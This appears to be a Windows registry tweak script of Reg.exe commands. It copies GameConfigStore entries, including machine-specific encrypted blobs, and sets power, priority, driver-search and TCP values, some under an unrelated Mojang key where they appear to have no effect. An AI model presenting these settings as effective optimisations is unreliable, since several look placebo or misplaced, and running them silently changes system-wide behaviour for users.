Reg.exe add "HKCU\System\GameConfigStore\Children\efcf187d-4945-4351-a98a-75e2174c9622" /v "TitleId" /t REG_SZ /d "2066051089" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f09e4f3d-0532-4849-be15-84f788238f94" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f09e4f3d-0532-4849-be15-84f788238f94" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f09e4f3d-0532-4849-be15-84f788238f94" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f09e4f3d-0532-4849-be15-84f788238f94" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000037b835da036dc33207405b52ff9331fa8839879acb4c9e65f7b2affdc92b014b000000000e800000000200002000000031f76d7cb95987ce8f5d0fdbe3aa1ebdbf9caf57b8f00c35acac377cd5eb70bb20000000e6228ab74c81d5e99faeb0c6700a0ce3fc2ce33a541f0b8898fcf7af479fb40a40000000c89a9ece63276ae4a82bb033ccaf29bfc1ea109e8995af8a578806b67787410fcdcb5344af0bddb29b5364db7671e9a62399853c95f9684106b0ba89c0ffe852" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f09e4f3d-0532-4849-be15-84f788238f94" /v "GameDVR_GameGUID" /t REG_SZ /d "554b6181-aab1-4c3e-b094-e6d3dbb5b1c7" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f09e4f3d-0532-4849-be15-84f788238f94" /v "TitleId" /t REG_SZ /d "1625658903" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f11b2656-13c5-4853-b40c-b19b585b1848" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f11b2656-13c5-4853-b40c-b19b585b1848" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f11b2656-13c5-4853-b40c-b19b585b1848" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f11b2656-13c5-4853-b40c-b19b585b1848" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000001e73e4c82ba1aef5e7c3c72b7b9c86d7e0cbd6bef6ae6f565e4108890507cab1000000000e8000000002000020000000e9abd925ebcdcaef695775ac41b5479d1abe5df956c47d1e679cf47deea921d11000000020b7e15df0f72ea44831af179a18298c400000001438002231724b7b64b8d2474aa3d395bac952e15afefdb2dfc11d137a19f66cc5bc6b8d102e2baa2c63ad3d785a715d99d7e5cc9d4cac80c8c2dac106282fb5" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f11b2656-13c5-4853-b40c-b19b585b1848" /v "ExeParentDirectory" /t REG_SZ /d "Football Manager 2016" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f11b2656-13c5-4853-b40c-b19b585b1848" /v "GameDVR_GameGUID" /t REG_SZ /d "a8f7ac30-5e5a-4576-9270-9128281651d0" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f11b2656-13c5-4853-b40c-b19b585b1848" /v "TitleId" /t REG_SZ /d "1840192853" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f32dcc88-b7b8-44f9-aa75-65c56b892571" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f32dcc88-b7b8-44f9-aa75-65c56b892571" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f32dcc88-b7b8-44f9-aa75-65c56b892571" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f32dcc88-b7b8-44f9-aa75-65c56b892571" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000068dc6c87eab147d1eb0baed563170a1898c1c397bec1215048e4637cc45d80d6000000000e80000000020000200000007c8a89f77ac452cabeea16be65958a11f0495227a9f742219509c673e77aa97c3000000004be50d61c291c9ef72d6ca3e83db399ec0c22c394be0e7511fe8a598fcc8886da4218bf504cf9ed37296456e518abed40000000ac2d643f068dca838284b6b1e05043acb6d5f7025fdf7f0fe5d9f4a658feb275d830eb2de3b3416f9fb3f6cf3b0845b4c6c809f5739a9df5544563b4449258af" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f32dcc88-b7b8-44f9-aa75-65c56b892571" /v "GameDVR_GameGUID" /t REG_SZ /d "6b4a265d-d929-4b46-afd7-0da75f0dddcd" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f32dcc88-b7b8-44f9-aa75-65c56b892571" /v "TitleId" /t REG_SZ /d "1698925306" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000008a43c2d67c7f48bcdfc64b822d2619be6b1e66065252b5a536c1acc4bd592926000000000e8000000002000020000000370b1153d3d5662262e58a22b9ee2d8e937b7e8701101012fedab16af61c636c100000003cf701741a7f7412ff1ab492dd89cb4f40000000a71e9021ab2e709c6fc293c863f3d3e7d44f53fa54dbde12de4cf9764861d80593532b81aeba4357390ae51814dcf68da6ae28e75a402cd8ea542e67a8c6f3a1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /v "ExeParentDirectory" /t REG_SZ /d "Final Fantasy FFX" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /v "GameDVR_GameGUID" /t REG_SZ /d "3e51bbe8-2433-4cb0-8c81-5c49d022afad" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /v "TitleId" /t REG_SZ /d "1781682593" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f817cc32-56a9-40bd-b0d9-23eea5180be7" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f817cc32-56a9-40bd-b0d9-23eea5180be7" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f817cc32-56a9-40bd-b0d9-23eea5180be7" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f817cc32-56a9-40bd-b0d9-23eea5180be7" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000003cb3df52064dbaf89bfb2d2899f81938d8200bc9d6ab97e5c97fe44d6242baf4000000000e8000000002000020000000108ca93f649200e49f2ee95c6b8190172f97d06925878661b427b6688dce90ba1000000070675e25b1eb9d924dd3196646873c42400000004f4216b189c94ab36cc23716a6ec8f5c7628bcf124c47095f82696b9ea0dd5c2af4201df518ecebbee3471d19c226dfbaf2a4759d91f0b5c711d676067e82a88" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f817cc32-56a9-40bd-b0d9-23eea5180be7" /v "ExeParentDirectory" /t REG_SZ /d "Football Manager 2017" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f817cc32-56a9-40bd-b0d9-23eea5180be7" /v "GameDVR_GameGUID" /t REG_SZ /d "59c1ed54-b5ed-462e-bfc0-533364b6eb1b" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\f817cc32-56a9-40bd-b0d9-23eea5180be7" /v "TitleId" /t REG_SZ /d "2068593342" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000fc81d8225783ddecd2ddbbffa724b4f0389c240ae9956eb78b233abf372145c0000000000e8000000002000020000000d0a997de3b9de7d40d9943a5da76fc160bf306fdf5ffadcdfb1be4d454e75d3c4000000033d3320ef5f834ce0405ff9ac5d61504c9fae3e2232a81abee576fa4353b61a8045e9f29d85c95f0f68db141b7be5fbcacebf93bd7488a04307fd5c8d2f3a2574000000024b91cd156274eb63164985bc3e453b03837563a28b02ecf1eef92aec856916e3c94cd2670ee0e74e8852cf2739852eb771ad7df12b56a06e0c97b94fb8c8a71" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "GameDVR_GameGUID" /t REG_SZ /d "0dbef0c8-0e99-4215-a848-e66dcc1e552e" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "TitleId" /t REG_SZ /d "1847408598" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "ProcessDependencies" /t REG_MULTI_SZ /d "dwm.exe|8\0audiodg.exe|1\0battle.net.exe|8\0battle.net helper.exe|8" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "AGGProfile" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\fd061fe8-4abb-49a5-87dc-04b417fc9d58" /v "AGCpuAlloc" /t REG_DWORD /d "6" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\0bc97dda792354c9738b56ce8b6486c71f23735b" /v "Children" /t REG_MULTI_SZ /d "70c3139d-9c99-4038-ad15-1d6bf312fb15" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\13db9297cda46cb056db3bc2ca1b76cb297c4bc9" /v "Children" /t REG_MULTI_SZ /d "11163eb8-ff97-4fc8-a4d1-1d46c9565579\05d93a35e-310b-4e76-8967-b97ae66016a2" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\15e1a4ba98e6b8d7ab5ed6b778e0c1319b265846" /v "Children" /t REG_MULTI_SZ /d "40aa1199-5ca0-4ee6-be13-eb5009af6889" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\164de021641dc218ccc9560b9223323ab5028c2b" /v "Children" /t REG_MULTI_SZ /d "e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\17d98bb2acb993926de96803a5c39132efc65ae6" /v "Children" /t REG_MULTI_SZ /d "efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\18645e43f893a0388102a69294599ef555693e6a" /v "Children" /t REG_MULTI_SZ /d "9d41f6f1-5618-4606-a8ec-1100921065fc" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\19ca7875365b44cc1c8d081d2f9f7baa7225c118" /v "Children" /t REG_MULTI_SZ /d "405c1cab-14ed-4e85-97a8-ec71126aa2e7" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\1dac836e9d3d73374af08b598159d227ae66c385" /v "Children" /t REG_MULTI_SZ /d "b1e0341d-a9d2-402c-a242-90ae9b02723c" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\21d43df2829a486c9db797b7a369973eadf496a5" /v "Children" /t REG_MULTI_SZ /d "73400fc2-5ae9-4532-86dd-29d81bae1132" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\2bca56e235e511f19c933498c6dca99dc768874f" /v "Children" /t REG_MULTI_SZ /d "46fc0979-b6fb-4de8-b90d-253cc753d244" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\2ccad2ffd4b63b943db57c84977eb9eafc39407f" /v "Children" /t REG_MULTI_SZ /d "cc7a8a23-73ee-4311-b901-ac0934555ff8" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\3baec0d39784813923364ce0be05a0a5cadea9a6" /v "Children" /t REG_MULTI_SZ /d "40e28932-7ee7-404d-b262-77693fb6f631" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\3f73174dd51c9ac4b7c2d21e36cdf4f619b3dc0a" /v "Children" /t REG_MULTI_SZ /d "f09e4f3d-0532-4849-be15-84f788238f94" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\461a1d0e3274a67f935b9aa1a6542c2303de5b5d" /v "Children" /t REG_MULTI_SZ /d "bba1d6d2-9a61-42e8-8600-e0dafb8fa1d6" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\4e5a7f5000fd4c998166c2662d4b4194217171f6" /v "Children" /t REG_MULTI_SZ /d "c1e4be0f-1b0f-4324-a064-adccbdb98dae" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\54a192d374e9e0f0134509646ebf8797e6a9e951" /v "Children" /t REG_MULTI_SZ /d "37578440-a809-44bd-88fe-2f00932796b4" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\556f7542d20ee2ee986355b044240b4d83998589" /v "Children" /t REG_MULTI_SZ /d "008af23d-f4cc-4435-9422-b95fecf4b177" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\5751eb83e35f2c2a1cff00d464a314d51d61bc8d" /v "Children" /t REG_MULTI_SZ /d "456db1d1-339b-4a77-8b0b-6795a1699345\0a987fbc1-fde0-406f-a039-922a6104ad2f" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\6b7bb0624f10321f62d3e1907984037b693ec034" /v "Children" /t REG_MULTI_SZ /d "d34d89a7-68fc-4d19-90e7-3a6f206b7ca0" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\6ff4490185970e12c42bf9ff6edb6211715ae6f0" /v "Children" /t REG_MULTI_SZ /d "a15993e5-3e93-4968-a526-b96ec64f3995" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\7410f82bb530dfbe6916585ad3dec34738eee856" /v "Children" /t REG_MULTI_SZ /d "326c86ae-f3a9-4980-8b9e-1da326311c76" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\747b52f67b4650136507fee1134415172c89cb72" /v "Children" /t REG_MULTI_SZ /d "241e0838-282a-453c-bf0c-b453987e7fa3" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\760cbffe1bb3645cf041d74c5fd01959666e4b71" /v "Children" /t REG_MULTI_SZ /d "5bb62464-0905-4a39-b7e4-317edb6f0b33" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\78362f170001b9043c42ad7a29b7093e69a12e36" /v "Children" /t REG_MULTI_SZ /d "c197c13c-6b0c-4810-81d1-548ed723a399" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\784cd9ae7b605f77cbab744e674eaed0fadf9da4" /v "Children" /t REG_MULTI_SZ /d "50ef2ba5-7013-4e09-917e-2e77e806b4d4" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\7cc4477119972383c7fc71b5f96e02b364bba0a8" /v "Children" /t REG_MULTI_SZ /d "ae876636-f272-4eb2-aaa6-a110af0bd907" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\7ff175d986357b05f6f779b329e471b9bd3e1397" /v "Children" /t REG_MULTI_SZ /d "eaf3cd49-369a-40e7-9294-ca808398be54" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\818bbb92210157befde3d513732a0f68fcb21f22" /v "Children" /t REG_MULTI_SZ /d "b184ff46-9cdc-4e94-b598-5e5db72274a2" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\83d1c9503115e7a5bd770352f612762236d960a0" /v "Children" /t REG_MULTI_SZ /d "40406386-7428-4521-a6f9-2f0581086ddf" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\86ac5f666fad6fe265cd9f69fa56309e34359f05" /v "Children" /t REG_MULTI_SZ /d "9fc09f67-272f-43f3-8c0b-2557f99f08fd" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\9d706dfab071ca7347ab3a1414917e3b7e921565" /v "Children" /t REG_MULTI_SZ /d "7c6c29ed-6638-4b39-87c9-90749f34fd0f" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\9dd084799375aa6369c95c0e6dce89f6faa084ba" /v "Children" /t REG_MULTI_SZ /d "0731122e-f429-4e74-8501-842bc3d88850" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\9e5c30e60b97bc1279cd05f0922c71e64dc1855b" /v "Children" /t REG_MULTI_SZ /d "00e51963-7a20-47e8-86dd-c5061773edad" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\a50cecbc1813396c210d4878031f61788e7fa199" /v "Children" /t REG_MULTI_SZ /d "43c24735-989f-477c-8ced-dc705c0a60aa" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\a6ec42280ea39e6cfb7748477a1f50b3bd4168f6" /v "Children" /t REG_MULTI_SZ /d "c9519863-23c7-4c40-9bc4-ce362db7e451" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\a86e29e1b9b350d33c81de049a2f90d7d01300b6" /v "Children" /t REG_MULTI_SZ /d "8d4cda1b-ff25-4b90-b9eb-212e1939db2c" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\a921abdb05dbf53aab652322f6593dee42c2b1ed" /v "Children" /t REG_MULTI_SZ /d "4f561632-47cd-4c2b-93a9-e1da865f03ba" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\a9ddf809324ceacc524160285cfa19772e1bd810" /v "Children" /t REG_MULTI_SZ /d "77b4d6e3-85d7-4ae9-ad9b-52b42f98077f" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\aeea45e8f7554649a505fbab6d8dc9ecf551216d" /v "Children" /t REG_MULTI_SZ /d "fd061fe8-4abb-49a5-87dc-04b417fc9d58" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\b22d1f8f1f566b00e9043a2cade7c2134f29bb4e" /v "Children" /t REG_MULTI_SZ /d "df67af05-43cc-40b4-9665-a53aaf762185" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\b41b8262de472dbbdc8020df06aa2c0b7e3ea813" /v "Children" /t REG_MULTI_SZ /d "f32dcc88-b7b8-44f9-aa75-65c56b892571" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\b4806c5e824b322a99b84056515450922fe5640a" /v "Children" /t REG_MULTI_SZ /d "e4d45d34-f695-4946-b390-aafd888b99ba" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\ba53742a9490396f8c5033fde191afc9be8dee59" /v "Children" /t REG_MULTI_SZ /d "5cdff6ad-e34e-4062-877b-3fe82e7c8949" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\ba6a31c3a81dac0acfb3b70d1c3f2730049c020d" /v "Children" /t REG_MULTI_SZ /d "04cc06c9-e532-4b12-a143-77fc1cb3283a" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\bb86857323422599613eeec70a2c8fb69a1b5048" /v "Children" /t REG_MULTI_SZ /d "f5c0fdf2-5311-4291-a813-3fc6fd0670b5" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\beeaf57760b6078f2048d7ac5a1569c40a224ddb" /v "Children" /t REG_MULTI_SZ /d "b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\bf76d7aa2319c58db1fcc054a1d6ebc68d7ec02d" /v "Children" /t REG_MULTI_SZ /d "daff267a-d1b8-46cd-a81a-6d62df3e01bd" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\c864119dc43a344a0cea2e48e3152ff47bc2aea4" /v "Children" /t REG_MULTI_SZ /d "0a956050-9628-4220-b516-808e497417c6" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\c8f36f5d2b339324d4e0350447a928b0a59dedb8" /v "Children" /t REG_MULTI_SZ /d "6053cdf7-6d52-42c8-9967-a29a542b7ae1" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\c8f57eb7877c46cdc947e3858c73ae5a90b800a2" /v "Children" /t REG_MULTI_SZ /d "9b9b54e1-b0b2-42f8-b46a-63386dd30005" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\cd628eff300490dd25e28b5bd6867dd5b3a119af" /v "Children" /t REG_MULTI_SZ /d "e7644f6a-21c2-441c-97a8-13ed3ba581b3\037b0bb90-816e-4853-b8e4-b943541b2f03" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\d2dd1c0d911ca04f99087a96acbc876968e287bb" /v "Children" /t REG_MULTI_SZ /d "efcf187d-4945-4351-a98a-75e2174c9622" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\d30a8f0e5e4a0e9287cac0649e8567053f6228c4" /v "Children" /t REG_MULTI_SZ /d "c83d8550-bfd3-4fe6-a5ed-256363e86756" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\db731c30be44928da277be5eb0d3ed1b191da99c" /v "Children" /t REG_MULTI_SZ /d "70df813c-6159-4d82-b679-3b79c7aa6cb1" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\dccff1b68e615cd9388a94b302b7211469ed58dd" /v "Children" /t REG_MULTI_SZ /d "4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\e248deb5fd1953c61c576f79afec8755e3ce6b2b" /v "Children" /t REG_MULTI_SZ /d "3409f26f-7bae-42a6-9c74-99c544ce5476" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\e37cabb84155061d2de72ac9e8b633373e5f4e03" /v "Children" /t REG_MULTI_SZ /d "bdf4f2dc-25d6-4cb4-8f2c-c268c4b0e339" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\e65172718d545564b6d96726e22492027026b92a" /v "Children" /t REG_MULTI_SZ /d "3f43ed16-df66-4422-abd8-925b1350bb64" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\e8e54db2f478e83bccbe834d2ee69fc21c7b9991" /v "Children" /t REG_MULTI_SZ /d "9253f3de-1abd-412c-8fca-25196b323e44" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\ea33dbb01c010936a19f91c660f93b49001a49b9" /v "Children" /t REG_MULTI_SZ /d "89012e6d-35ec-4578-bdbd-1e9c2f91d561" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\ed8fd9401e0c084095e97928a94b5ced4a9f0dc0" /v "Children" /t REG_MULTI_SZ /d "f11b2656-13c5-4853-b40c-b19b585b1848\0f817cc32-56a9-40bd-b0d9-23eea5180be7\088bba3e3-6149-435f-8f03-2e763a6b28e5" /f
Reg.exe add "HKCU\System\GameConfigStore\Parents\fd13f746e7d2d69760b017363f621255c9b49ac8" /v "Children" /t REG_MULTI_SZ /d "0f715c27-e790-401f-b0a4-58a636f50f48" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabledDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip" /v "MTU" /t REG_DWORD /d "5216" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip" /v "MSS" /t REG_DWORD /d "5216" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "KeepAliveTime" /t REG_DWORD /d "60000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "KeepAliveInterval" /t REG_DWORD /d "1000" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "TCPInitialRtt" /t REG_DWORD /d "300" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "TcpRecSegmentSize" /t REG_DWORD /d "2446674" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "EnablePMTUBHDetect" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "16777215" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
Reg.exe add "HKCU\SOFTWARE\Mojang" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
